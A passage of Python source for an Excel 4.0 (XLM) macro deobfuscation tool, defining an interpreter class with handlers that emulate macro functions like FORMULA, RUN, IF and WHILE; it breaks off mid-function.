import argparse
import hashlib
import os
import sys
import json
import time
from lark import Lark
from lark.exceptions import ParseError
from lark.lexer import Token
from lark.tree import Tree
from XLMMacroDeobfuscator.excel_wrapper import XlApplicationInternational
from XLMMacroDeobfuscator.xlsm_wrapper import XLSMWrapper
from XLMMacroDeobfuscator.__init__ import __version__

try:
    from XLMMacroDeobfuscator.xls_wrapper import XLSWrapper

    HAS_XLSWrapper = True
except:
    HAS_XLSWrapper = False
    print('pywin32 is not installed (only is required if you want to use MS Excel)')

from XLMMacroDeobfuscator.xls_wrapper_2 import XLSWrapper2
from XLMMacroDeobfuscator.xlsb_wrapper import XLSBWrapper
from enum import Enum
import time
import datetime
from XLMMacroDeobfuscator.boundsheet import *
import os
import operator
import copy
from distutils.util import strtobool


class EvalStatus(Enum):
    FullEvaluation = 1
    PartialEvaluation = 2
    Error = 3
    NotImplemented = 4
    End = 5
    Branching = 6
    FullBranching = 7
    IGNORED = 8


class EvalResult:
    def __init__(self, next_cell, status, value, text):
        self.next_cell = next_cell
        self.status = status
        self.value = value
        self.text = None

        self.set_text(text)

    @staticmethod
    def is_int(text):
        try:
            int(text)
            return True
        except (ValueError, TypeError):
            return False

    @staticmethod
    def is_float(text):
        try:
            float(text)
            return True
        except (ValueError, TypeError):
            return False

    @staticmethod
    def unwrap_str_literal(string):
        result = str(string)
        if len(result) > 1 and result.startswith('"') and result.endswith('"'):
            result = result[1:-1].replace('""', '"')
        return result

    @staticmethod
    def wrap_str_literal(data):
        result = ''
        if EvalResult.is_float(data) or (len(data) > 1 and data.startswith('"') and data.endswith('"')):
            result = str(data)
        elif type(data) is float:
            if data.is_integer():
                data = int(data)
            result = str(data)
        elif type(data) is int or type(data) is bool:
            result = str(data)
        else:
            result = '"{}"'.format(data.replace('"', '""'))
        return result

    def get_text(self, unwrap=False):
        result = ''
        if self.text is not None:

            if self.is_float(self.text):
                self.text = float(self.text)
                if self.text.is_integer():
                    self.text = int(self.text)
                    self.text = str(self.text)

            if unwrap:
                result = self.unwrap_str_literal(self.text)
            else:
                result = self.text

        return result

    def set_text(self, data, wrap=False):
        if data is not None:
            if wrap:
                self.text = self.wrap_str_literal(data)
            else:
                self.text = str(data)


class XLMInterpreter:
    def __init__(self, xlm_wrapper):
        self.xlm_wrapper = xlm_wrapper
        self.cell_addr_regex_str = r"((?P<sheetname>[^\s]+?|'.+?')!)?\$?(?P<column>[a-zA-Z]+)\$?(?P<row>\d+)"
        self.cell_addr_regex = re.compile(self.cell_addr_regex_str)
        self.xlm_parser = self.get_parser()
        self.defined_names = self.xlm_wrapper.get_defined_names()
        self._branch_stack = []
        self._while_stack = []
        self._workspace_defaults = {}
        self._window_defaults = {}
        self._cell_defaults = {}
        self._expr_rule_names = ['expression', 'concat_expression', 'additive_expression', 'multiplicative_expression']
        self._operators = {'+': operator.add, '-': operator.sub, '*': operator.mul, '/': operator.truediv,
                           '>': operator.gt, '<': operator.lt, '<>':operator.ne}
        self._indent_level = 0
        self._indent_current_line = False
        self.day_of_month = None
        self.invoke_interpreter = False
        self.first_unknown_cell = None
        self.cell_with_unsuccessfull_set = set()
        self.selected_range = None
        self.active_cell = None
        self.ignore_processing = False
        self.next_count = 0

        self._handlers = {
            # functions
            'END.IF': self.end_if_handler,
            'FORMULA.FILL': self.formula_handler,
            'GET.CELL': self.get_cell_handler,
            'GET.WINDOW': self.get_window_handler,
            'GET.WORKSPACE': self.get_workspace_handler,
            'ON.TIME': self.on_time_handler,
            'SET.VALUE': self.set_value_handler,
            'SET.NAME': self.set_name_handler,
            'ACTIVE.CELL': self.active_cell_handler,

            # methods
            'AND': self.and_handler,
            'OR': self.or_handler,
            'CALL': self.call_handler,
            'CHAR': self.char_handler,
            'CLOSE': self.halt_handler,
            'CONCATENATE': self.concatenate_handler,
            'DAY': self.day_handler,
            'DIRECTORY': self.directory_handler,
            'ERROR': self.error_handler,
            'FORMULA': self.formula_handler,
            'GOTO': self.goto_handler,
            'HALT': self.halt_handler,
            'IF': self.if_handler,
            'MID': self.mid_handler,
            'NOW': self.now_handler,
            'ROUND': self.round_handler,
            'RUN': self.run_handler,
            'SEARCH': self.search_handler,
            'SELECT': self.select_handler,
            'WHILE': self.while_handler,
            'NEXT': self.next_handler

        }

    @staticmethod
    def is_float(text):
        try:
            float(text)
            return True
        except (ValueError, TypeError):
            return False

    @staticmethod
    def is_int(text):
        try:
            int(text)
            return True
        except (ValueError, TypeError):
            return False

    @staticmethod
    def is_bool(text):
        try:
            strtobool(text)
            return True
        except (ValueError, TypeError, AttributeError):
            return False

    def get_parser(self):
        xlm_parser = None
        grammar_file_path = os.path.join(os.path.dirname(__file__), 'xlm-macro.lark.template')
        with open(grammar_file_path, 'r', encoding='utf_8') as grammar_file:
            macro_grammar = grammar_file.read()
            macro_grammar = macro_grammar.replace('{{XLLEFTBRACKET}}',
                                                  self.xlm_wrapper.get_xl_international_char(
                                                      XlApplicationInternational.xlLeftBracket))
            macro_grammar = macro_grammar.replace('{{XLRIGHTBRACKET}}',
                                                  self.xlm_wrapper.get_xl_international_char(
                                                      XlApplicationInternational.xlRightBracket))
            macro_grammar = macro_grammar.replace('{{XLLISTSEPARATOR}}',
                                                  self.xlm_wrapper.get_xl_international_char(
                                                      XlApplicationInternational.xlListSeparator))
            xlm_parser = Lark(macro_grammar, parser='lalr')

        return xlm_parser

    def get_formula_cell(self, macrosheet, col, row):
        result_cell = None
        not_found = False
        row = int(row)
        current_row = row
        current_addr = col + str(current_row)
        while current_addr not in macrosheet.cells or \
                macrosheet.cells[current_addr].formula is None:
            if (current_row - row) < 10000:
                current_row += 1
            else:
                not_found = True
                break
            current_addr = col + str(current_row)

        if not_found is False:
            result_cell = macrosheet.cells[current_addr]

        return result_cell

    def get_cell_addr(self, current_cell, cell_parse_tree):

        res_sheet = res_col = res_row = None
        if type(cell_parse_tree) is Token:
            names = self.xlm_wrapper.get_defined_names()

            label = cell_parse_tree.value.lower()
            if label in names:
                res_sheet, res_col, res_row = Cell.parse_cell_addr(names[label])
            elif label.strip('"') in names:
                res_sheet, res_col, res_row = Cell.parse_cell_addr(names[label.strip('"')])
            else:

                if len(label)>1 and label.startswith('"') and label.endswith('"'):
                    label = label.strip('"')
                    root_parse_tree = self.xlm_parser.parse('='+label)
                    res_sheet, res_col, res_row = self.get_cell_addr(current_cell, root_parse_tree.children[0])
                    p = 1

        else:
            cell = cell_parse_tree.children[0]

            if cell.data == 'a1_notation_cell':
                if len(cell.children) == 2:
                    cell_addr = "'{}'!{}".format(cell.children[0], cell.children[1])
                else:
                    cell_addr = cell.children[0]
                res_sheet, res_col, res_row = Cell.parse_cell_addr(cell_addr)

                if res_sheet is None and res_col is not None:
                    res_sheet = current_cell.sheet.name
            elif cell.data == 'r1c1_notation_cell':
                current_col = Cell.convert_to_column_index(current_cell.column)
                current_row = int(current_cell.row)

                for current_child in cell.children:
                    if current_child.type == 'NAME':
                        res_sheet = current_child.value
                    elif self.is_float(current_child.value):
                        val = int(float(current_child.value))
                        if last_seen == 'r':
                            res_row = val
                        else:
                            res_col = val
                    elif current_child.value.startswith('['):
                        val = int(current_child.value[1:-1])
                        if last_seen == 'r':
                            res_row = current_row + val
                        else:
                            res_col = current_col + val
                    elif current_child.lower() == 'r':
                        last_seen = 'r'
                        res_row = current_row
                    elif current_child.lower() == 'c':
                        last_seen = 'c'
                        res_col = current_col
                    else:
                        raise Exception('Cell addresss, Syntax Error')

                if res_sheet is None:
                    res_sheet = current_cell.sheet.name
                res_row = str(res_row)
                res_col = Cell.convert_to_column_name(res_col)
            else:
                raise Exception('Cell addresss, Syntax Error')

        return res_sheet, res_col, res_row

    def get_cell(self, sheet_name, col, row):
        result = None
        sheets = self.xlm_wrapper.get_macrosheets()
        if sheet_name in sheets:
            sheet = sheets[sheet_name]
            addr = col + str(row)
            if addr in sheet.cells:
                result = sheet.cells[addr]

        return result

    def set_cell(self, sheet_name, col, row, text):
        sheets = self.xlm_wrapper.get_macrosheets()
        if sheet_name in sheets:
            sheet = sheets[sheet_name]
            addr = col + str(row)
            if addr not in sheet.cells:
                new_cell = Cell()
                new_cell.column = col
                new_cell.row = row
                new_cell.sheet = sheet
                sheet.cells[addr] = new_cell

            cell = sheet.cells[addr]

            if text.startswith('='):
                cell.formula = text

            cell.value = text

    def convert_ptree_to_str(self, parse_tree_root):
        if type(parse_tree_root) == Token:
            return str(parse_tree_root)
        else:
            result = ''
            for child in parse_tree_root.children:
                result += self.convert_ptree_to_str(child)
            return result

    def get_window(self, number):
        result = None
        if len(self._window_defaults) == 0:
            script_dir = os.path.dirname(__file__)
            config_dir = os.path.join(script_dir, 'configs')
            with open(os.path.join(config_dir, 'get_window.conf'), 'r', encoding='utf_8') as workspace_conf_file:
                for index, line in enumerate(workspace_conf_file):
                    line = line.strip()
                    if len(line) > 0:
                        if self.is_float(line) is True:
                            self._window_defaults[index + 1] = int(float(line))
                        else:
                            self._window_defaults[index + 1] = line

        if number in self._window_defaults:
            result = self._window_defaults[number]
        return result

    def get_workspace(self, number):
        result = None
        if len(self._workspace_defaults) == 0:
            script_dir = os.path.dirname(__file__)
            config_dir = os.path.join(script_dir, 'configs')
            with open(os.path.join(config_dir, 'get_workspace.conf'), 'r', encoding='utf_8') as workspace_conf_file:
                for index, line in enumerate(workspace_conf_file):
                    line = line.strip()
                    if len(line) > 0:
                        self._workspace_defaults[index + 1] = line

        if number in self._workspace_defaults:
            result = self._workspace_defaults[number]
        return result

    def get_default_cell_info(self, number):
        result = None
        if len(self._cell_defaults) == 0:
            script_dir = os.path.dirname(__file__)
            config_dir = os.path.join(script_dir, 'configs')
            with open(os.path.join(config_dir, 'get_cell.conf'), 'r', encoding='utf_8') as workspace_conf_file:
                for index, line in enumerate(workspace_conf_file):
                    line = line.strip()
                    if len(line) > 0:
                        self._cell_defaults[index + 1] = line

        if number in self._cell_defaults:
            result = self._cell_defaults[number]
        return result

    def evaluate_formula(self, current_cell, name, arguments, interactive, destination_arg=1):

        source, destination = (arguments[0], arguments[1]) if destination_arg == 1 else (arguments[1], arguments[0])

        src_eval_result = self.evaluate_parse_tree(current_cell, source, interactive)

        if destination.data == 'range':
            dst_start_sheet, dst_start_col, dst_start_row = self.get_cell_addr(current_cell, destination.children[0])
            dst_end_sheet, dst_end_col, dst_end_row = self.get_cell_addr(current_cell, destination.children[2])
        else:
            dst_start_sheet, dst_start_col, dst_start_row = self.get_cell_addr(current_cell, destination)
            dst_end_sheet, dst_end_col, dst_end_row = dst_start_sheet, dst_start_col, dst_start_row

        destination_str = self.convert_ptree_to_str(destination)

        text = src_eval_result.get_text(unwrap=True)
        if src_eval_result.status == EvalStatus.FullEvaluation:
            for row in range(int(dst_start_row), int(dst_end_row)+1):
                for col in range(Cell.convert_to_column_index(dst_start_col),
                                 Cell.convert_to_column_index(dst_end_col)+1):
                    if (dst_start_sheet, Cell.convert_to_column_name(col) + str(row)) in self.cell_with_unsuccessfull_set:
                        self.cell_with_unsuccessfull_set.remove((dst_start_sheet,
                                                                 Cell.convert_to_column_name(col) + str(row)))

                    self.set_cell(dst_start_sheet,
                                  Cell.convert_to_column_name(col),
                                  str(row),
                                  text)
        else:
            for row in range(int(dst_start_row), int(dst_end_row)+1):
                for col in range(Cell.convert_to_column_index(dst_start_col),
                                 Cell.convert_to_column_index(dst_end_col)+1):
                    self.cell_with_unsuccessfull_set.add((dst_start_sheet,
                                                             Cell.convert_to_column_name(col) + str(row)))

        if destination_arg == 1:
            text = "{}({},{})".format( name,
                                       src_eval_result.get_text(),
                                       destination_str)
        else:
            text = "{}({},{})".format( name,
                                       destination_str,
                                       src_eval_result.get_text())
        return_val = 0
        return EvalResult(None, src_eval_result.status, return_val, text)

    def evaluate_argument_list(self, current_cell, name, arguments):
        args_str = ''
        for argument in arguments:
            if type(argument) is Token or type(argument) is Tree:
                arg_eval_Result = self.evaluate_parse_tree(current_cell, argument, False)
                args_str += arg_eval_Result.get_text() + ','

        args_str = args_str.strip(',')
        return_val = text = '{}({})'.format(name, args_str)
        status = EvalStatus.PartialEvaluation

        return EvalResult(None, status, return_val, text)

    def evaluate_method(self, current_cell, parse_tree_root, interactive):
        method_name = parse_tree_root.children[0] + '.' + \
                      parse_tree_root.children[2]

        if self.ignore_processing:
            return EvalResult(None, EvalStatus.IGNORED, 0, '')

        arguments = []
        for i in parse_tree_root.children[4].children:
            if type(i) is not Token:
                if len(i.children) > 0:
                    arguments.append(i.children[0])
        size = len(arguments)

        if method_name in self._handlers:
            eval_result = self._handlers[method_name](arguments, current_cell, interactive, parse_tree_root)
        else:
            eval_result = self.evaluate_argument_list(current_cell, method_name, arguments)

        return eval_result

    def evaluate_function(self, current_cell, parse_tree_root, interactive):
        function_name = parse_tree_root.children[0]

        if self.ignore_processing and function_name != 'NEXT':
            if function_name == 'WHILE':
                self.next_count += 1
            return EvalResult(None, EvalStatus.IGNORED, 0, '')

        arguments = []
        for i in parse_tree_root.children[2].children:
            if type(i) is not Token:
                if len(i.children) > 0:
                    arguments.append(i.children[0])
                else:
                    arguments.append(i.children)

        if function_name in self._handlers:
            eval_result = self._handlers[function_name](arguments, current_cell, interactive, parse_tree_root)

        elif function_name.lower() in self.defined_names:
            # TODO: this block should be unreachable, if reachable it indicated grammar error
            cell_text = self.defined_names[function_name.lower()]
            next_sheet, next_col, next_row = self.parse_cell_address(cell_text)
            next_cell = self.get_formula_cell(next_sheet, next_col, next_row)
            return_val = text = function_name
            status = EvalStatus.FullEvaluation
            eval_result = EvalResult(next_cell, status, return_val, text)

        else:
            eval_result = self.evaluate_argument_list(current_cell, function_name, arguments)

        return eval_result

    # region Handlers
    def and_handler(self, arguments, current_cell, interactive, parse_tree_root):
        value = True
        status = EvalStatus.FullEvaluation
        for arg in arguments:
            arg_eval_result = self.evaluate_parse_tree(current_cell, arg, interactive)
            if arg_eval_result.status == EvalStatus.FullEvaluation:
                if EvalResult.unwrap_str_literal(str(arg_eval_result.value)).lower() != "true":
                    value = False
                    break
            else:
                status = EvalStatus.PartialEvaluation
                value = False
                break

        return EvalResult(None, status, value, str(value))

    def or_handler(self, arguments, current_cell, interactive, parse_tree_root):
        value = False
        status = EvalStatus.FullEvaluation
        for arg in arguments:
            arg_eval_result = self.evaluate_parse_tree(current_cell, arg, interactive)
            if arg_eval_result.status == EvalStatus.FullEvaluation:
                if EvalResult.unwrap_str_literal(str(arg_eval_result.value)).lower() == "true":
                    value = True
                    break
            else:
                status = EvalStatus.PartialEvaluation
                break

        return EvalResult(None, status, value, str(value))

    def active_cell_handler(self, arguments, current_cell, interactive, parse_tree_root):
        status = EvalStatus.PartialEvaluation
        if self.active_cell:
            return_val = self.active_cell.value
            text = str(return_val)
            status = EvalStatus.FullEvaluation
        else:
            text = self.convert_ptree_to_str(parse_tree_root)

        return EvalResult(None, status, return_val, text)

    def get_cell_handler(self, arguments, current_cell, interactive, parse_tree_root):
        arg1_eval_result = self.evaluate_parse_tree(current_cell, arguments[0], interactive)
        dst_sheet, dst_col, dst_row = self.get_cell_addr(current_cell, arguments[1])
        type_id = arg1_eval_result.value
        if self.is_float(type_id):
            type_id = int(float(type_id))
        if dst_sheet is None:
            dst_sheet = current_cell.sheet.name
        status = EvalStatus.PartialEvaluation
        if arg1_eval_result.status == EvalStatus.FullEvaluation:
            data, not_exist, not_implemented = self.xlm_wrapper.get_cell_info(dst_sheet, dst_col, dst_row, type_id)
            if not_exist and 1 == 2:
                return_val = self.get_default_cell_info(type_id)
                text = str(return_val)
                status = EvalStatus.FullEvaluation
            elif not_implemented:
                text = self.convert_ptree_to_str(parse_tree_root)
                return_val = ''
            else:
                text = str(data) if data is not None else None
                return_val = data
                status = EvalStatus.FullEvaluation
        # text = self.convert_ptree_to_str(parse_tree_root)
        # return_val = ''
        # status = EvalStatus.PartialEvaluation
        return EvalResult(None, status, return_val, text)

    def set_name_handler(self, arguments, current_cell, interactive, parse_tree_root):
        label = self.convert_ptree_to_str(arguments[0])
        arg2_eval_result = self.evaluate_parse_tree(current_cell, arguments[1], interactive)
        if arg2_eval_result.status is EvalStatus.FullEvaluation:
            arg2_text = arg2_eval_result.get_text(unwrap=True)
            names = self.xlm_wrapper.get_defined_names()
            names[label] = arg2_text
            text = 'SET.NAME({},{})'.format(label, arg2_text)
            return_val = 0
            status = EvalStatus.FullEvaluation
        else:
            return_val = text = self.convert_ptree_to_str(parse_tree_root)
            status = arg2_eval_result.status

        return EvalResult(None, status, return_val, text)

    def end_if_handler(self, arguments, current_cell, interactive, parse_tree_root):
        self._indent_level -= 1
        self._indent_current_line = True
        status = EvalStatus.FullEvaluation

        return EvalResult(None, status, 'END.IF', 'END.IF')

    def get_workspace_handler(self, arguments, current_cell, interactive, parse_tree_root):
        status = EvalStatus.Error
        if len(arguments) == 1:
            arg1_eval_Result = self.evaluate_parse_tree(current_cell, arguments[0], interactive)

            if arg1_eval_Result.status == EvalStatus.FullEvaluation and self.is_float(arg1_eval_Result.get_text()):
                workspace_param = self.get_workspace(int(float(arg1_eval_Result.get_text())))
                current_cell.value = workspace_param
                text = 'GET.WORKSPACE({})'.format(arg1_eval_Result.get_text())
                return_val = workspace_param
                status = EvalStatus.FullEvaluation
                next_cell = None

        if status == EvalStatus.Error:
            return_val = text = self.convert_ptree_to_str(parse_tree_root)

        return EvalResult(None, status, return_val, text)

    def get_window_handler(self, arguments, current_cell, interactive, parse_tree_root):
        status = EvalStatus.Error
        if len(arguments) == 1:
            arg_eval_result = self.evaluate_parse_tree(current_cell, arguments[0], interactive)

            if arg_eval_result.status == EvalStatus.FullEvaluation and self.is_float(arg_eval_result.get_text()):
                window_param = self.get_window(int(float(arg_eval_result.get_text())))
                current_cell.value = window_param
                text = window_param  # self.convert_ptree_to_str(parse_tree_root)
                return_val = window_param
                status = EvalStatus.FullEvaluation
            else:
                return_val = text = 'GET.WINDOW({})'.format(arg_eval_result.get_text())
                status = arg_eval_result.status
        if status == EvalStatus.Error:
            return_val = text = self.convert_ptree_to_str(parse_tree_root)

        return EvalResult(None, status, return_val, text)

    def on_time_handler(self, arguments, current_cell, interactive, parse_tree_root):
        status = EvalStatus.Error
        if len(arguments) == 2:
            arg1_eval_result = self.evaluate_parse_tree(current_cell, arguments[0], interactive)
            next_sheet, next_col, next_row = self.get_cell_addr(current_cell, arguments[1])
            sheets = self.xlm_wrapper.get_macrosheets()
            if next_sheet in sheets:
                next_cell = self.get_formula_cell(sheets[next_sheet], next_col, next_row)
                text = 'ON.TIME({},{})'.format(arg1_eval_result.get_text(), str(next_cell))
                status = EvalStatus.FullEvaluation
                return_val = 0

        if status == EvalStatus.Error:
            return_val = text = self.convert_ptree_to_str(parse_tree_root)
            next_cell = None

        return EvalResult(next_cell, status, return_val, text)

    def concatenate_handler(self, arguments, current_cell, interactive, parse_tree_root):
        text = ''
        for arg in arguments:
            arg_eval_result = self.evaluate_parse_tree(current_cell, arg, interactive)
            text += arg_eval_result.get_text(unwrap=True)
        return_val = text
        text = EvalResult.wrap_str_literal(text)
        status = EvalStatus.FullEvaluation
        return EvalResult(None, status, return_val, text)

    def day_handler(self, arguments, current_cell, interactive, parse_tree_root):
        if self.day_of_month is None:
            arg1_eval_result = self.evaluate_parse_tree(current_cell, arguments[0], interactive)
            if arg1_eval_result.status == EvalStatus.FullEvaluation:
                if type(arg1_eval_result.value) is datetime.datetime:
                    text = str(arg1_eval_result.value.day)
                    return_val = text
                    status = EvalStatus.FullEvaluation
                elif self.is_float(arg1_eval_result.value):
                    text = 'DAY(Serial Date)'
                    status = EvalStatus.NotImplemented
            else:
                text = self.convert_ptree_to_str(parse_tree_root)
                status = arg1_eval_result.status
        else:
            text = str(self.day_of_month)
            return_val = text
            status = EvalStatus.FullEvaluation
        return EvalResult(None, status, return_val, text)

    def now_handler(self, arguments, current_cell, interactive, parse_tree_root):
        return_val = text = datetime.datetime.now()
        status = EvalStatus.FullEvaluation
        return EvalResult(None, status, return_val, text)

    def if_handler(self, arguments, current_cell, interactive, parse_tree_root):
        visited = False
        for stack_frame in self._branch_stack:
            if stack_frame[0].get_local_address() == current_cell.get_local_address():
                visited = True
        if visited is False:
            self._indent_level += 1
            size = len(arguments)
            if size == 3:
                cond_eval_result = self.evaluate_parse_tree(current_cell, arguments[0], interactive)
                if self.is_bool(cond_eval_result.value):
                    cond_eval_result.value = bool(strtobool(cond_eval_result.value))

                if cond_eval_result.status == EvalStatus.FullEvaluation:
                    if cond_eval_result.value:
                        if type(arguments[1]) is Tree or type(arguments[1]) is Token:
                            self._branch_stack.append(
                                (current_cell, arguments[1], current_cell.sheet.cells, self._indent_level, '[TRUE]'))
                            status = EvalStatus.Branching
                        else:
                            status = EvalStatus.FullEvaluation
                    else:
                        if type(arguments[2]) is Tree or type(arguments[2]) is Token:
                            self._branch_stack.append(
                                (current_cell, arguments[2], current_cell.sheet.cells, self._indent_level, '[FALSE]'))
                            status = EvalStatus.Branching
                        else:
                            status = EvalStatus.FullEvaluation
                    text = self.convert_ptree_to_str(parse_tree_root)

                else:
                    memory_state = copy.deepcopy(current_cell.sheet.cells)
                    if type(arguments[2]) is Tree or type(arguments[2]) is Token or type(arguments[2]) is list:
                        self._branch_stack.append(
                            (current_cell, arguments[2], memory_state, self._indent_level, '[FALSE]'))

                    if type(arguments[1]) is Tree or type(arguments[1]) is Token or type(arguments[1]) is list:
                        self._branch_stack.append(
                            (current_cell, arguments[1], current_cell.sheet.cells, self._indent_level, '[TRUE]'))

                    text = self.convert_ptree_to_str(parse_tree_root)

                    status = EvalStatus.FullBranching
            else:
                status = EvalStatus.FullEvaluation
                text = self.convert_ptree_to_str(parse_tree_root)
        else:
            # loop detected
            text = '[[LOOP]]: ' + self.convert_ptree_to_str(parse_tree_root)
            status = EvalStatus.End
        return EvalResult(None, status, 0, text)

    def mid_handler(self, arguments, current_cell, interactive, parse_tree_root):
        sheet_name, col, row = self.get_cell_addr(current_cell, arguments[0])
        cell = self.get_cell(sheet_name, col, row)
        status = EvalStatus.PartialEvaluation
        base_eval_result = self.evaluate_parse_tree(current_cell, arguments[1], interactive)
        len_eval_result = self.evaluate_parse_tree(current_cell, arguments[2], interactive)

        if cell is not None:
            if base_eval_result.status == EvalStatus.FullEvaluation and \
                    len_eval_result.status == EvalStatus.FullEvaluation:
                if self.is_float(base_eval_result.value) and self.is_float(len_eval_result.value):
                    base = int(float(base_eval_result.value)) - 1
                    length = int(float(len_eval_result.value))
                    return_val = cell.value[base: base + length]
                    text = str(return_val)
                    status = EvalStatus.FullEvaluation
        if status == EvalStatus.PartialEvaluation:
            text = 'MID({},{},{})'.format(self.convert_ptree_to_str(arguments[0]),
                                          self.convert_ptree_to_str(arguments[1]),
                                          self.convert_ptree_to_str(arguments[2]))

        return EvalResult(None, status, return_val, text)

    def goto_handler(self, arguments, current_cell, interactive, parse_tree_root):
        next_sheet, next_col, next_row = self.get_cell_addr(current_cell, arguments[0])
        if next_sheet is not None and next_sheet in self.xlm_wrapper.get_macrosheets():
            next_cell = self.get_formula_cell(self.xlm_wrapper.get_macrosheets()[next_sheet],
                                              next_col,
                                              next_row)
            status = EvalStatus.FullEvaluation
        else:
            status = EvalStatus.Error
        text = self.convert_ptree_to_str(parse_tree_root)
        return_val = 0
        return EvalResult(next_cell, status, return_val, text)

    def halt_handler(self, arguments, current_cell, interactive, parse_tree_root):
        return_val = text = self.convert_ptree_to_str(parse_tree_root)
        status = EvalStatus.End
        self._indent_level -= 1
        return EvalResult(None, status, return_val, text)

    def call_handler(self, arguments, current_cell, interactive, parse_tree_root):
        argument_texts = []
        status = EvalStatus.FullEvaluation
        for argument in arguments:
            arg_eval_result = self.evaluate_parse_tree(current_cell, argument, interactive)
            if arg_eval_result.status != EvalStatus.FullEvaluation:
                status = arg_eval_result.status
            argument_texts.append(arg_eval_result.get_text())

        list_separator = self.xlm_wrapper.get_xl_international_char(XlApplicationInternational.xlListSeparator)
        text = 'CALL({})'.format(list_separator.join(argument_texts))
        return_val = 0
        return EvalResult(None, status, return_val, text)

    def is_number_handler(self, arguments, current_cell, interactive, parse_tree_root):
        eval_result = self.evaluate_parse_tree(current_cell, arguments[0], interactive)
        if eval_result.status == EvalStatus.FullEvaluation:
            if type(eval_result.value) is float or type(eval_result.value) is int:
                return_val = True
            else:
                return_val = False
            text = str(return_val)
        else:
            return_val = text = 'ISNUMBER({})'.format(eval_result.get_text())

        return EvalResult(None, eval_result.status, return_val, text)

    def search_handler(self, arguments, current_cell, interactive, parse_tree_root):
        arg1_eval_res = self.evaluate_parse_tree(current_cell, arguments[0], interactive)
        arg2_eval_res = self.evaluate_parse_tree(current_cell, arguments[1], interactive)

        if arg1_eval_res.status == EvalStatus.FullEvaluation and arg2_eval_res.status == EvalStatus.FullEvaluation:
            try:
                arg1_val = arg1_eval_res.get_text(unwrap=True)
                arg2_val = arg2_eval_res.get_text(unwrap=True)
                return_val = arg2_val.lower().index(arg1_val.lower())
                text = str(return_val)
            except ValueError:
                return_val = None
                text = ''
            status = EvalStatus.FullEvaluation
        else:
            text = 'SEARCH({},{})'.format(arg1_eval_res.get_text(), arg2_eval_res.get_text())
            return_val = 0
            status = EvalStatus.PartialEvaluation

        return EvalResult(None, status, return_val, text)

    def round_handler(self, arguments, current_cell, interactive, parse_tree_root):
        arg1_eval_res = self.evaluate_parse_tree(current_cell, arguments[0], interactive)
        arg2_eval_res = self.evaluate_parse_tree(current_cell, arguments[1], interactive)
        if arg1_eval_res.status == EvalStatus.FullEvaluation and arg2_eval_res.status == EvalStatus.FullEvaluation:
            return_val = round(float(arg1_eval_res.value), int(float(arg2_eval_res.value)))
            text = str(return_val)
            status = EvalStatus.FullEvaluation
        return EvalResult(None, status, return_val, text)

    def directory_handler(self, arguments, current_cell, interactive, parse_tree_root):
        text = r'C:\Users\user\Documents'
        return_val = text
        status = EvalStatus.FullEvaluation
        return EvalResult(None, status, return_val, text)

    def char_handler(self, arguments, current_cell, interactive, parse_tree_root):
        arg_eval_result = self.evaluate_parse_tree(current_cell, arguments[0], interactive)

        if arg_eval_result.status == EvalStatus.FullEvaluation:
            if 0 <= float(arg_eval_result.text) <= 255:
                return_val = text = chr(int(float(arg_eval_result.text)))
                cell = self.get_formula_cell(current_cell.sheet, current_cell.column, current_cell.row)
                cell.value = text
                status = EvalStatus.FullEvaluation
            else:
                return_val = text = self.convert_ptree_to_str(parse_tree_root)
                status = EvalStatus.Error
        else:
            text = 'CHAR({})'.format(arg_eval_result.text)
            return_val = text
            status = EvalStatus.PartialEvaluation
        return EvalResult(arg_eval_result.next_cell, status, return_val, text)

    def run_handler(self, arguments, current_cell, interactive, parse_tree_root):
        size = len(arguments)

        if 1 <= size <= 2:
            next_sheet, next_col, next_row = self.get_cell_addr(current_cell, arguments[0])
            if next_sheet is not None and next_sheet in self.xlm_wrapper.get_macrosheets():
                next_cell = self.get_formula_cell(self.xlm_wrapper.get_macrosheets()[next_sheet],
                                                  next_col,
                                                  next_row)
                if size == 1:
                    text = 'RUN({}!{}{})'.format(next_sheet, next_col, next_row)
                else:
                    text = 'RUN({}!{}{}, {})'.format(next_sheet, next_col, next_row,
                                                     self.convert_ptree_to_str(arguments[1]))
                status = EvalStatus.FullEvaluation
            else:
                text = self.convert_ptree_to_str(parse_tree_root)
                status = EvalStatus.Error
            return_val = 0
        else:
            text = self.convert_ptree_to_str(parse_tree_root)
            status = EvalStatus.Error

        return EvalResult(next_cell, status, return_val, text)

    def formula_handler(self, arguments, current_cell, interactive, parse_tree_root):
        return self.evaluate_formula(current_cell, 'FORMULA', arguments, interactive)

    def formula_fill_handler(self, arguments, current_cell, interactive, parse_tree_root):
        return self.evaluate_formula(current_cell, 'FORMULA.FILL', arguments, interactive)

    def set_value_handler(self, arguments, current_cell, interactive, parse_tree_root):
        return self.evaluate_formula(current_cell, 'SET.VALUE', arguments, interactive, destination_arg=2)

    def error_handler(self, arguments, current_cell, interactive, parse_tree_root):
        return EvalResult(None, EvalStatus.Error, 0, self.convert_ptree_to_str(parse_tree_root))

    def select_handler(self, arguments, current_cell, interactive, parse_tree_root):
        status = EvalStatus.PartialEvaluation

        range_eval_result = self.evaluate_parse_tree(current_cell, arguments[0], interactive)

        if len(arguments) == 2:
            # e.g., SELECT(B1:B100,B1) and SELECT(,"R[1]C")
            if self.active_cell:
                sheet, col, row = self.get_cell_addr(self.active_cell, arguments[1])
            else:
                sheet, col, row = self.get_cell_addr(current_cell, arguments[1])

            if sheet:
                self.active_cell = self.get_cell(sheet, col, row)
                status = EvalStatus.FullEvaluation

        else:
            # e.g., SELECT(D1:D10:D1)
            sheet, col, row = self.selected_range[2]
            if sheet:
                self.active_cell = self.get_cell(sheet, col, row)
                status = EvalStatus.FullEvaluation

        text = self.convert_ptree_to_str(parse_tree_root)
        return_val = 0

        return EvalResult(None, status, return_val, text)

    def while_handler(self, arguments, current_cell, interactive, parse_tree_root):
        status = EvalStatus.PartialEvaluation
        text = ''

        stack_record = {'start_point': current_cell, 'status': False}

        condition_eval_result = self.evaluate_parse_tree(current_cell, arguments[0], interactive)
        status = condition_eval_result.status
        if condition_eval_result.status == EvalStatus.FullEvaluation:
            if str(condition_eval_result.value).lower() == 'true':
                stack_record['status'] = True
            text = '{} -> [{}]'.format(self.convert_ptree_to_str(parse_tree_root),
                                       str(condition_eval_result.value))

        if not text:
            text = '{}'.format(self.convert_ptree_to_str(parse_tree_root))

        self._while_stack.append(stack_record)

        if stack_record['status'] == False:
            self.ignore_processing = True
            self.next_count = 0

        self._indent_level += 1

        return EvalResult(None, status, 0, text)

    def next_handler(self, arguments, current_cell, interactive, parse_tree_root):
        status = EvalStatus.FullEvaluation
        if self.next_count == 0:
            self.ignore_processing = False
            next_cell = None
            if len(self._while_stack) > 0:
                top_record = self._while_stack.pop()
